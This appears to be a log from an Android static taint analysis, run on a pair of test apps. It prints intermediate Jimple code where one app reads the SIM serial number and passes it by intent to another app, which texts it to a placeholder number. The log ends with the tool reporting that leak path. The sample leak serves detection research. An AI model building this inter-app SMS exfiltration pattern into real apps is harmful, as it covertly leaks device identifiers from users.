+
+        $r4 = virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: android.content.Intent getIntent()>();
+
+     label5:
+        if $i0 == 5 goto label3;
+
+     label6:
+        if $i0 == 6 goto label2;
+
+        if $i0 == 7 goto label7;
+
+        if $i0 == 8 goto label2;
+
+     label7:
+        if $i0 == 10 goto label1;
+
+        return;
+    }
+
+wrapper method <de.foellix.sinkapp.SinkMainActivity: void <init>()> 
+    public void <init>()
+    {
+        de.foellix.sinkapp.SinkMainActivity $r0;
+
+        $r0 := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        specialinvoke $r0.<android.app.Activity: void <init>()>();
+
+        return;
+    }
+
+wrapper method <de.foellix.sinkapp.SinkMainActivity: void sink()> 
+    private void sink()
+    {
+        de.foellix.sinkapp.SinkMainActivity $r0;
+        android.content.Intent $r1;
+        java.lang.String $r2;
+        android.telephony.SmsManager $r3;
+
+        $r0 := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        $r1 = virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: android.content.Intent getIntent()>();
+
+        $r2 = virtualinvoke $r1.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>("Secret");
+
+        $r3 = staticinvoke <android.telephony.SmsManager: android.telephony.SmsManager getDefault()>();
+
+        virtualinvoke $r3.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("+49111111111", null, $r2, null, null);
+
+        return;
+    }
+
+wrapper method <de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)> 
+    protected void onCreate(android.os.Bundle)
+    {
+        de.foellix.sinkapp.SinkMainActivity $r0;
+        android.os.Bundle $r1;
+        int $i0;
+        java.lang.String[] $r2;
+
+        $r0 := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        $r1 := @parameter0: android.os.Bundle;
+
+        specialinvoke $r0.<android.app.Activity: void onCreate(android.os.Bundle)>($r1);
+
+        virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void setContentView(int)>(2130903040);
+
+        $i0 = virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: int checkSelfPermission(java.lang.String)>("android.permission.SEND_SMS");
+
+        if $i0 == 0 goto label1;
+
+        $r2 = newarray (java.lang.String)[1];
+
+        $r2[0] = "android.permission.SEND_SMS";
+
+        virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void requestPermissions(java.lang.String[],int)>($r2, 0);
+
+        return;
+
+     label1:
+        specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void sink()>();
+
+        return;
+    }
+
+wrapper method <de.foellix.sinkapp.SinkMainActivity: void onRequestPermissionsResult(int,java.lang.String[],int[])> 
+    public void onRequestPermissionsResult(int, java.lang.String[], int[])
+    {
+        de.foellix.sinkapp.SinkMainActivity $r0;
+        int $i0;
+        java.lang.String[] $r1;
+        int[] $r2;
+
+        $r0 := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        $i0 := @parameter0: int;
+
+        $r1 := @parameter1: java.lang.String[];
+
+        $r2 := @parameter2: int[];
+
+        specialinvoke $r0.<android.app.Activity: void onRequestPermissionsResult(int,java.lang.String[],int[])>($i0, $r1, $r2);
+
+        specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void sink()>();
+
+        return;
+    }
+
+wrapper method <de.foellix.sinkapp.SinkMainActivity: void <init>(android.content.Intent)> 
+    public void <init>(android.content.Intent)
+    {
+        de.foellix.sinkapp.SinkMainActivity $r0;
+        android.content.Intent $r1;
+
+        $r0 := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        $r1 := @parameter0: android.content.Intent;
+
+        specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void <init>()>();
+
+        <de.foellix.sinkapp.SinkMainActivity: android.content.Intent intent_for_ipc> = $r1;
+
+        return;
+    }
+
+wrapper method <de.foellix.sinkapp.SinkMainActivity: android.content.Intent getIntent()> 
+    public android.content.Intent getIntent()
+    {
+        de.foellix.sinkapp.SinkMainActivity $r0;
+        android.content.Intent $r1;
+
+        $r0 := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        $r1 = <de.foellix.sinkapp.SinkMainActivity: android.content.Intent intent_for_ipc>;
+
+        return $r1;
+    }
+
+wrapper method <de.foellix.sinkapp.SinkMainActivity: android.content.Intent getIntentForActivityResult()> 
+    public android.content.Intent getIntentForActivityResult()
+    {
+        de.foellix.sinkapp.SinkMainActivity $r0;
+        android.content.Intent $r1;
+
+        $r0 := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        $r1 = <de.foellix.sinkapp.SinkMainActivity: android.content.Intent intent_for_activity_result>;
+
+        return $r1;
+    }
+
+wrapper method <de.foellix.sinkapp.SinkMainActivity: void dummyMainMethod()> 
+    public void dummyMainMethod()
+    {
+        de.foellix.sinkapp.SinkMainActivity this, $r0;
+        int $i0;
+        android.os.Bundle $r1;
+        java.lang.String[] $r2;
+        int[] $r3;
+        android.content.Intent $r4;
+
+        this := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        $i0 = 0;
+
+        $i0 = virtualinvoke this.<de.foellix.sinkapp.SinkMainActivity: int fuzzyMe()>();
+
+     label1:
+        if $i0 == 0 goto label7;
+
+        $r0 = new de.foellix.sinkapp.SinkMainActivity;
+
+        specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void <init>()>();
+
+        if $i0 == 1 goto label7;
+
+        $r1 = new android.os.Bundle;
+
+        specialinvoke $r1.<android.os.Bundle: void <init>()>();
+
+        virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r1);
+
+        $r1 = null;
+
+     label2:
+        if $i0 == 2 goto label6;
+
+     label3:
+        if $i0 == 3 goto label4;
+
+        $r2 = newarray (java.lang.String)[1];
+
+        $r2[0] = "";
+
+        $r3 = newarray (int)[1];
+
+        $r3[0] = 0;
+
+        virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void onRequestPermissionsResult(int,java.lang.String[],int[])>(0, $r2, $r3);
+
+     label4:
+        if $i0 == 4 goto label5;
+
+        $r4 = virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: android.content.Intent getIntent()>();
+
+     label5:
+        if $i0 == 5 goto label3;
+
+     label6:
+        if $i0 == 6 goto label2;
+
+        if $i0 == 7 goto label7;
+
+        if $i0 == 8 goto label2;
+
+     label7:
+        if $i0 == 10 goto label1;
+
+        return;
+    }
+
+wrapper method <de.foellix.sinkapp.SinkMainActivity: int fuzzyMe()> 
+    public int fuzzyMe()
+    {
+        de.foellix.sinkapp.SinkMainActivity $r0;
+
+        $r0 := @this: de.foellix.sinkapp.SinkMainActivity;
+
+        return 1;
+    }
+
+create method to call wrapper class: de.foellix.sinkapp.SinkMainActivity
+new lifecypcle method: <IpcSC: void redirector0(android.content.Intent)> body:     public static void redirector0(android.content.Intent)
+    {
+        android.content.Intent $r0;
+        de.foellix.sinkapp.SinkMainActivity $r1;
+
+        $r0 := @parameter0: android.content.Intent;
+
+        $r1 = new de.foellix.sinkapp.SinkMainActivity;
+
+        specialinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void <init>(android.content.Intent)>($r0);
+
+        virtualinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void dummyMainMethod()>();
+
+        return;
+    }
+
+new body: 
+    private void source()
+    {
+        de.foellix.sourceapp.SourceMainActivity $r0;
+        android.content.Intent $r1;
+        java.lang.Object $r2;
+        android.telephony.TelephonyManager $r3;
+        java.lang.String $r4;
+
+        $r0 := @this: de.foellix.sourceapp.SourceMainActivity;
+
+        $r2 = virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: java.lang.Object getSystemService(java.lang.String)>("phone");
+
+        $r3 = (android.telephony.TelephonyManager) $r2;
+
+        $r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>();
+
+        $r1 = new android.content.Intent;
+
+        specialinvoke $r1.<android.content.Intent: void <init>(java.lang.String)>("de.foellix.CALLSINK");
+
+        virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("Secret", $r4);
+
+        virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: void startActivity(android.content.Intent)>($r1);
+
+        staticinvoke <IpcSC: void redirector0(android.content.Intent)>($r1);
+
+        return;
+    }
+
+    private void source()
+    {
+        de.foellix.sourceapp.SourceMainActivity $r0;
+        android.content.Intent $r1;
+        java.lang.Object $r2;
+        android.telephony.TelephonyManager $r3;
+        java.lang.String $r4;
+
+        $r0 := @this: de.foellix.sourceapp.SourceMainActivity;
+
+        $r2 = virtualinvoke $r0.<de.foellix.sourceapp.SourceMainActivity: java.lang.Object getSystemService(java.lang.String)>("phone");
+
+        $r3 = (android.telephony.TelephonyManager) $r2;
+
+        $r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>();
+
+        $r1 = new android.content.Intent;
+
+        specialinvoke $r1.<android.content.Intent: void <init>(java.lang.String)>("de.foellix.CALLSINK");
+
+        virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("Secret", $r4);
+
+        staticinvoke <IpcSC: void redirector0(android.content.Intent)>($r1);
+
+        return;
+    }
+
+In step Ending, The number of Jimple line is 28419
+In step Ending, The number of Jimple method is 8465
+In step Ending, The number of Jimple class is 607
+In step Ending, The number of Jimple component is 6
+
+[Call Graph] For information on where the call graph may be incomplete, use the verbose option to the cg phase.
+[Spark] Pointer Assignment Graph in 0.0 seconds.
+[Spark] Type masks in 0.0 seconds.
+[Spark] Pointer Graph simplified in 0.0 seconds.
+[Spark] Propagation in 0.0 seconds.
+[Spark] Solution found in 0.0 seconds.
+[main] INFO soot.jimple.infoflow.Infoflow - Callgraph has 88 edges
+[main] INFO soot.jimple.infoflow.android.InfoflowAndroidConfiguration - Implicit flow tracking is NOT enabled
+[main] INFO soot.jimple.infoflow.android.InfoflowAndroidConfiguration - Exceptional flow tracking is enabled
+[main] INFO soot.jimple.infoflow.android.InfoflowAndroidConfiguration - Running with a maximum access path length of 5
+[main] INFO soot.jimple.infoflow.android.InfoflowAndroidConfiguration - Using path-agnostic result collection
+[main] INFO soot.jimple.infoflow.android.InfoflowAndroidConfiguration - Recursive access path shortening is enabled
+[main] INFO soot.jimple.infoflow.Infoflow - Looking for sources and sinks...
+[main] INFO soot.jimple.infoflow.Infoflow - Source lookup done, found 9 sources and 1 sinks.
+[main] INFO soot.jimple.infoflow.Infoflow - Taint wrapper hits: 61
+[main] INFO soot.jimple.infoflow.Infoflow - Taint wrapper misses: 76
+[main] INFO soot.jimple.infoflow.Infoflow - IFDS problem with 429 forward and 93 backward edges solved, processing 1 results...
+[main] INFO soot.jimple.infoflow.data.pathBuilders.ContextSensitivePathBuilder - Context-sensitive path reconstructor started
+[main] INFO soot.jimple.infoflow.data.pathBuilders.ContextSensitivePathBuilder - Obtainted 1 connections between null sources and sinks
+[main] INFO soot.jimple.infoflow.data.pathBuilders.ContextSensitivePathBuilder - Building path 1
+[main] INFO soot.jimple.infoflow.data.pathBuilders.ContextSensitivePathBuilder - Path processing took 0.041015828 seconds in total
+[main] INFO soot.jimple.infoflow.Infoflow - The sink virtualinvoke $r3.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("+49111111111", null, $r2, null, null) on line 34 in method <de.foellix.sinkapp.SinkMainActivity: void sink()> was called with values from the following sources:
+[main] INFO soot.jimple.infoflow.Infoflow - - $r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>() on line 34 in method <de.foellix.sourceapp.SourceMainActivity: void source()>
+[main] INFO soot.jimple.infoflow.Infoflow - 	on Path: 
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sourceapp.SourceMainActivity: void source()>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> $r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>()
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sourceapp.SourceMainActivity: void source()>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("Secret", $r4)
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sourceapp.SourceMainActivity: void source()>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> staticinvoke <IpcSC: void redirector0(android.content.Intent)>($r1)
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <IpcSC: void redirector0(android.content.Intent)>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> specialinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void <init>(android.content.Intent)>($r0)
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sinkapp.SinkMainActivity: void <init>(android.content.Intent)>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> <de.foellix.sinkapp.SinkMainActivity: android.content.Intent intent_for_ipc> = $r1
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <dummyMainClass: void dummyMainMethod(java.lang.String[])>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> virtualinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r2)
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void sink()>()
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sinkapp.SinkMainActivity: void sink()>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> $r1 = virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: android.content.Intent getIntent()>()
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sinkapp.SinkMainActivity: android.content.Intent getIntent()>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> $r1 = <de.foellix.sinkapp.SinkMainActivity: android.content.Intent intent_for_ipc>
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sinkapp.SinkMainActivity: android.content.Intent getIntent()>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> return $r1
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sinkapp.SinkMainActivity: void sink()>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> $r2 = virtualinvoke $r1.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>("Secret")
+[main] INFO soot.jimple.infoflow.Infoflow - 	 -> <de.foellix.sinkapp.SinkMainActivity: void sink()>
+[main] INFO soot.jimple.infoflow.Infoflow - 		 -> virtualinvoke $r3.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("+49111111111", null, $r2, null, null)
+Found a flow to sink virtualinvoke $r3.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("+49111111111", null, $r2, null, null) on line 34, from the following sources:
+	- $r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>() (in <de.foellix.sourceapp.SourceMainActivity: void source()>)
+		on Path [$r4 = virtualinvoke $r3.<android.telephony.TelephonyManager: java.lang.String getSimSerialNumber()>(), virtualinvoke $r1.<android.content.Intent: android.content.Intent putExtra(java.lang.String,java.lang.String)>("Secret", $r4), staticinvoke <IpcSC: void redirector0(android.content.Intent)>($r1), specialinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void <init>(android.content.Intent)>($r0), <de.foellix.sinkapp.SinkMainActivity: android.content.Intent intent_for_ipc> = $r1, virtualinvoke $r1.<de.foellix.sinkapp.SinkMainActivity: void onCreate(android.os.Bundle)>($r2), specialinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: void sink()>(), $r1 = virtualinvoke $r0.<de.foellix.sinkapp.SinkMainActivity: android.content.Intent getIntent()>(), $r1 = <de.foellix.sinkapp.SinkMainActivity: android.content.Intent intent_for_ipc>, return $r1, $r2 = virtualinvoke $r1.<android.content.Intent: java.lang.String getStringExtra(java.lang.String)>("Secret"), virtualinvoke $r3.<android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)>("+49111111111", null, $r2, null, null)]
+Maximum memory consumption: 156.85056 MB
+Analysis has run for 5.836454563 seconds
